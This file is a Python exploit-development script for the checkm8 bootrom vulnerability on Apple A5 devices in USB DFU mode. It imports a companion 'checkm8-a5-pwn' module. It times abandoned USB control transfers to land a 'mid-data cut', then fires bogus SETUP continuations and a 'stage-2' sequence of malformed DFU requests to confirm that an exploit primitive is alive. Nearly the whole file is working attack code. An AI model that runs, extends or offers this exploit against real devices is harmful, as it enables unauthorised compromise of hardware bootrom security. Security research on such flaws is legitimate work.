#!/usr/bin/env python3
"""Hunt the mid-data cut, then witness the A5 state with a continuation.

Loop: fire solo abandon-cut shots across the hot zone [430..660]us,
round-robin 5us steps. On the first shot that lands a MID-DATA CUT
(0 < actual < 128), IMMEDIATELY (same process, same handle, ~ms) send
the bogus continuation (0x00/0x00 SETUP, wLength 0x40, 64 bytes data):
- the earlier-session remainder class: bogus SETUP data is ACKed as a
  CONTINUATION of the pending phase if the A5 io_globals still hold
  the cut phase (rc=0 COMPLETION = stage-2 primitive ALIVE).
Afterwards: serve health probes.
"""
import ctypes
import fcntl
import glob
import os
import time

import importlib.util

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)


def serve_probe(timeout=400):
    class Ctl(ctypes.Structure):
        _fields_ = [('r', ctypes.c_ubyte), ('b', ctypes.c_ubyte),
                    ('w', ctypes.c_ushort), ('i', ctypes.c_ushort),
                    ('l', ctypes.c_ushort), ('t', ctypes.c_uint),
                    ('d', ctypes.c_void_p)]
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() != "1227":
                continue
        except OSError:
            continue
        n = os.path.dirname(p)
        bus = int(open(n + "/busnum").read())
        dev = int(open(n + "/devnum").read())
        fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)
        buf = ctypes.create_string_buffer(255)
        ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, timeout,
                 ctypes.cast(buf, ctypes.c_void_p))
        t0 = time.time()
        try:
            r = fcntl.ioctl(fd, 0xC0185500, ct)
            return "ret=%d %.1fms cpid=%s" % (
                r, (time.time() - t0) * 1000,
                "CPID" in buf.raw[:r].decode("utf-16le", "ignore"))
        except OSError as e:
            return "errno=%d %.1fms" % (e.errno, (time.time() - t0) * 1000)
        finally:
            os.close(fd)
    return "GONE"


def wait_dfu(timeout=900):
    import glob as g
    t0 = time.time()
    if any(open(p).read().strip() == '1227'
           for p in g.glob('/sys/bus/usb/devices/*/idProduct')
           if __import__('os').path.exists(p)):
        print("stale device attached - power-hold + dance NOW (waiting)")
        while any(open(p).read().strip() == '1227'
                  for p in g.glob('/sys/bus/usb/devices/*/idProduct')
                  if __import__('os').path.exists(p)):
            if time.time() - t0 > timeout:
                return False
            time.sleep(0.05)
        print("gone - do the dance")
    while time.time() - t0 < timeout:
        if any(open(p).read().strip() == '1227'
               for p in g.glob('/sys/bus/usb/devices/*/idProduct')
               if __import__('os').path.exists(p)):
            return True
        time.sleep(0.05)
    return False


def stage2_suite(usb, handle):
    """The stage-2 ladder, fired while the STALL endgame state is hot."""
    tests = [
        ('dfu-getstatus', 0xA1, 3, 0, 0, 6, b''),
        ('dfu-getstate',  0xA1, 5, 0, 0, 1, b''),
        ('dfu-dnload0',   0x21, 1, 0, 0, 0, b''),
        ('dfu-abort',     0x21, 6, 0, 0, 0, b''),
        ('bogus-0x00-64', 0x00, 0, 0, 0, 0x40, b'D' * 64),
        ('dnload-w40-d40', 0x21, 1, 0, 0, 0x40, b'K' * 0x40),
        ('dnload-w40-d80', 0x21, 1, 0, 0, 0x40, b'L' * 0x80),
        ('desc-dev18',    0x80, 6, 0x0100, 0, 0x12, b''),
    ]
    for name, r, b, w, i, l, data in tests:
        try:
            rc, info = usb.raw_ctrl(handle, r, b, w, i, l, data,
                                    abandon=False, timeout_ms=600, name=name)
            print("S2 %-16s: %s actual=%d elapsed=%dus%s"
                  % (name, d.STATUS_NAMES[info[0]], info[1], int(info[3]),
                     "  <<< ANOMALY" if info[0] == 0 and info[1] not in (0, l) else ""),
                  flush=True)
        except SystemExit as e:
            print("S2 %-16s: HANG" % name, flush=True)


def main():
    if not wait_dfu():
        print("no DFU entry")
        return 1
    time.sleep(0.8)
    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)
    print("armed; live=%s" % serve_probe())

    zone = [430, 445, 460, 475, 490, 505, 520, 535, 550, 565, 580,
            595, 610, 625, 640, 655, 500, 500, 500]
    hit = None
    stalled = False
    for shot in range(200):
        t = zone[shot % len(zone)]
        try:
            rc, info = usb.raw_ctrl(handle, 0x80, 6, (3 << 8) | 3, 0x040A,
                                    0x80, b'', abandon=True, cancel_at=0x40,
                                    abandon_timeout_ms=t / 1000.0,
                                    timeout_ms=500, name='hunt%d' % shot)
        except SystemExit as e:
            print("shot%d t=%d HANG" % (shot, t), flush=True)
            try:
                usb.release(handle)
            except Exception:
                pass
            time.sleep(1.0)
            try:
                dev, handle, desc, _ = d.acquire(usb, want_serial=False)
            except Exception:
                print("reacquire failed - stop")
                return 1
            continue
        status, actual, cancel_rc, elapsed = info
        print("shot%-3d t=%d: %-9s actual=%-3d %dus"
              % (shot, t, d.STATUS_NAMES[status], actual, elapsed),
              flush=True)
        if 0 < actual < 128:
            print(">>> MID-DATA CUT at shot%d t=%d" % (shot, t), flush=True)
            hit = (shot, t)
        if status == 4:  # STALL endgame signature
            print(">>> STALL endgame at shot%d - stage-2 suite NOW" % shot,
                  flush=True)
            stalled = True
            break
        time.sleep(0.65)
    if stalled:
        stage2_suite(usb, handle)
        for probe in range(3):
            time.sleep(0.6)
            print("  post%.1fs: %s" % (0.6 * (probe + 1), serve_probe()),
                  flush=True)
    elif hit:
        print("cuts landed: %r (window hunt incomplete - see log)" % hit)
    else:
        print("no cut/stall landed")
    return 0


if __name__ == "__main__":
    main()
